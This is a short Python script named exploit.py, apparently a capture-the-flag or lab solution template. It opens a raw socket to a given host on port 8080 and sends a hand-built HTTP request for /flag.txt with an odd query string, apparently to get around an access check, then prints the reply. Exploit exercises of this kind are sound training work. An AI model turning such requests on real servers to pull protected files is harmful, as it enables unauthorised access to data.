#!/usr/bin/env python3

import sys
import socket

# Exploit - moodify this function
def exploit(host):
    port = 8080

    # Create socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    s.sendall(b"GET /flag.txt?b HTTP/1.1\r\nHost: 10.211.55.10:8080\r\nUser-Agent: curl/7.84.0\r\nAccept: */*\r\n\r\n")
    print(s.recv(65536))
    print(s.recv(65536))

    # Close socket
    s.close()

# Main - do not modify
def main(argv):
    if len(argv) != 2:
        print("Usage: python3 exploit.py <host>")
        sys.exit(1)
    
    exploit(argv[1])
    
    host = argv[1]

if __name__ == "__main__":
    main(sys.argv)